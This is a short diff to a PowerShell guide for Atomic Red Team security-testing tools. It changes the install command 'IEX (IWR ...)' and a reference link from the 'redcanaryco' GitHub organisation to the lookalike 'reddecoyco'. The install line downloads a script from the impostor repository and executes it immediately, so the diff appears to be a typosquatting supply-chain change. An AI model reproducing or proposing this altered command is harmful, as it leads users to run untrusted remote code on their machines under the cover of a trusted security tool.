@@ -4,7 +4,7 @@
 
 ```powershell
 # Install
-IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1')
+IEX (IWR 'https://raw.githubusercontent.com/reddecoyco/invoke-atomicredteam/master/install-atomicredteam.ps1')
 Install-AtomicRedTeam -getAtomics
 
 # Execute technique
@@ -44,7 +44,7 @@ Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
 
 ## References
 
-- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
+- Atomic Red Team: https://github.com/reddecoyco/atomic-red-team
 - MITRE Caldera: https://github.com/mitre/caldera
 - Vectr: https://vectr.io/
 - ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
